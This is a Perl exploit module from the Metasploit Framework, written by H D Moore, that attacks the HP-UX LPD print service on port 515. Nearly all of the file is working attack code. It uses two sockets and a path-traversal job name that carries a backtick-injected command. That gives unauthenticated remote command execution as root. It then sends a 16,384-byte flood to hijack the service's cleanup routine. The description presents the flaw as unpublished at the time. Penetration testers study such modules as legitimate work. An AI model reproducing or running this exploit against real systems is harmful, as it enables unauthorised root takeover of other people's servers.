
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::hpux_lpd_exec;
use base "Msf::Exploit";
use IO::Socket;
use IO::Select;
use strict;

my $advanced = { };

my $info =
{
    'Name'  => 'HP-UX LPD Command Execution',
    'Version'  => '$Revision$',
    'Authors' => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]'],
    'Arch'  => [ 'parisc' ],
    'OS'    => [ 'hpux' ],
    'Priv'  => 0,
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The LPD server port', 515],
                   },
    'Payload' => {
        'Space'    => 200,
        'BadChars' => "\x00",
    },
    
    'Description'  => qq{
        This exploit abuses an unpublished vulnerability in the HP-UX LPD
        service. This flaw allows an unauthenticated attacker to execute
        arbitrary commands with the privileges of the root user. The LPD
        service is only exploitable when the address of the attacking system
        can be resolved by the target. This exploit has been tested against
        a fully patched HP-UX 11 system (06/07/04).
    },
    'Keys'  => ['cmd_nospaceslash'],
    'Refs'  =>  [  
                   # References? This is 0d4y
                ],
    
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}

sub Exploit {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_path = $self->GetVar('RPATH');
    my $cmd = $self->GetVar('EncodedPayload')->RawPayload;

    my $res;
    
    # We use one connection to configure the spool directory
    my $s1 = Msf::Socket->new();
    if (! $s1->Tcp($target_host, $target_port)) {
        $self->PrintLine("[*] Socket 1: ". $s1->GetError);
        return(0);
    }

    $s1->Send("\x02_X_\n");
    $res = $s1->Recv(1, 5);
    if (ord($res) != 0) {
        $self->PrintLine("[*] The target did not accept our job request command");
        $self->PrintLine("[*] Please verify that the target can resolve your address");
        return;
    }

    $s1->Send("\x02 1000 cfACONTROL\n");
    $res = $s1->Recv(1, 5);
    if (ord($res) != 0) {
        $self->PrintLine("[*] The target did not accept our control file request");
        return;
    }


    # We use a second connection to exploit the bug
    my $s2 = Msf::Socket->new();
    if (! $s2->Tcp($target_host, $target_port)) {
        $self->PrintLine("[*] Socket 3: ". $s2->GetError);
        $s1->Close;
        $s2->Close;        
        return;
    }

    srand(time() + $$);
    my $num = int(rand() * 1000);

    $s2->Send("\x02/../../../../../../../../tmp/msf$num`$cmd`\n");
    $res = $s2->Recv(1, 5);
    if (ord($res) != 0) {
        $self->PrintLine("[*] The target did not accept our second job request command");
        $s1->Close;
        $s2->Close;
        return;
    }

    $s2->Send("\x02 32 _X\n");
    $res = $s2->Recv(1, 5);
    if (ord($res) != 0) {
        $self->PrintLine("[*] The target did not accept our control file");
        $s1->Close;
        $s2->Close;
        return;
    }
    
    $self->PrintLine("[*] Please remember to remove /tmp/msf* and /var/spool/lp/msf*");
    $self->PrintLine("[*] Forcing an error and hijacking the cleanup routine...");
    $s2->Send("X" x 16384);
    $s1->Close;
    $s2->Close;
    return;
}
